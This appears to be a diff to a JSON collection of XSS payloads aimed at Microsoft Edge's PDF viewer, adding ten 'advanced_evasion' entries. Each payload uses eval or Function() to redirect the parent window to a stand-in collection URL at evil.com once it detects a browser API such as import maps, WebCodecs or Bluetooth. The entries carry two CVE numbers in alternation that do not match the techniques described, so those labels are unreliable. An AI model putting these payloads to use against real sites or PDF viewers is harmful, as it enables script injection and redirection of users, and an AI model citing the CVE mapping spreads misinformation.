@@ -3,7 +3,7 @@
     "browser": "edge",
     "name": "Microsoft Edge PDF Exploits",
     "description": "Microsoft Edge PDF viewer specific XSS payloads targeting Windows integration and WebView exploitation",
-    "total_payloads": 12,
+    "total_payloads": 22,
     "categories": [
       "windows_integration",
       "webview_exploit",
@@ -125,6 +125,106 @@
       "description": "Edge PDF Windows Public Documents access with URL parameter",
       "risk_level": "medium",
       "browser": "edge"
+    },
+    {
+      "id": "edge_013",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_chromium_import_maps_2024",
+      "payload": "try{if('importMap'in HTMLScriptElement.prototype){const script=document.createElement('script');script.type='importmap';script.textContent=JSON.stringify({'imports':{'exploit':'data:application/javascript,Function(\\'parent.location=\"https://evil.com/collect\"\\')()'}});document.head.appendChild(script);import('exploit');}else{throw new Error('Import maps not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Edge Chromium import maps bypass using ES6 module import",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-4863"
+    },
+    {
+      "id": "edge_014",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_webassembly_streaming_2024",
+      "payload": "try{if('compileStreaming'in WebAssembly){const wasmCode=new Uint8Array([0,97,115,109,1,0,0,0]);const response=new Response(wasmCode,{headers:{'Content-Type':'application/wasm'}});WebAssembly.compileStreaming(response).then(module=>Function('parent.location=\"https://evil.com/collect\"')());}else{throw new Error('WebAssembly streaming not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Edge WebAssembly streaming bypass using compile streaming API",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-5218"
+    },
+    {
+      "id": "edge_015",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_webcodecs_bypass_2024",
+      "payload": "try{if('VideoDecoder'in window){const decoder=new VideoDecoder({output:frame=>{frame.close();Function('parent.location=\"https://evil.com/collect\"')();},error:err=>eval('parent.window.location=\"https://evil.com/collect\"')});decoder.configure({codec:'vp8'});}else{throw new Error('WebCodecs not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Edge WebCodecs bypass using video decoder API trigger",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-4863"
+    },
+    {
+      "id": "edge_016",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_storage_foundation_bypass_2024",
+      "payload": "try{if('storageFoundation'in navigator){navigator.storageFoundation.open('test').then(storage=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Storage Foundation not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Edge Storage Foundation bypass using native file system access",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-5218"
+    },
+    {
+      "id": "edge_017",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_digital_goods_bypass_2024",
+      "payload": "try{if('getDigitalGoodsService'in window){window.getDigitalGoodsService('https://play.google.com/billing').then(service=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Digital Goods not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Edge Digital Goods API bypass using payment service integration",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-4863"
+    },
+    {
+      "id": "edge_018",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_scheduler_postTask_bypass_2024",
+      "payload": "try{if('scheduler'in window&&'postTask'in scheduler){scheduler.postTask(()=>Function('parent.location=\"https://evil.com/collect\"')(),{priority:'user-blocking'});}else{throw new Error('Scheduler not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Edge Scheduler.postTask bypass using task scheduling API",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-5218"
+    },
+    {
+      "id": "edge_019",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_bluetooth_bypass_2024",
+      "payload": "try{if('bluetooth'in navigator){navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(device=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Bluetooth not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Edge Bluetooth API bypass using device discovery trigger",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-4863"
+    },
+    {
+      "id": "edge_020",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_webrtc_encoded_transform_2024",
+      "payload": "try{if('RTCRtpScriptTransform'in window){const pc=new RTCPeerConnection();pc.addTransceiver('video',{direction:'sendonly'});const sender=pc.getSenders()[0];sender.transform=new RTCRtpScriptTransform('data:application/javascript,Function(\\'parent.location=\"https://evil.com/collect\"\\')()');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Edge WebRTC Encoded Transform bypass using RTP script transform",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-5218"
+    },
+    {
+      "id": "edge_021",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_shared_storage_bypass_2024",
+      "payload": "try{if('sharedStorage'in window){window.sharedStorage.worklet.addModule('data:application/javascript,class SharedStorageWorklet{async run(){Function(\\'parent.location=\"https://evil.com/collect\"\\')();}}registerSharedStorageWorklet(\\'test\\',SharedStorageWorklet);');}else{throw new Error('Shared Storage not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Edge Shared Storage bypass using worklet execution context",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-4863"
+    },
+    {
+      "id": "edge_022",
+      "category": "advanced_evasion",
+      "browser": "edge",
+      "technique": "edge_topics_api_bypass_2024",
+      "payload": "try{if('browsingTopics'in document){document.browsingTopics().then(topics=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Topics API not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Edge Topics API bypass using browsing topics privacy API",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-5218"
     }
   ]
 }
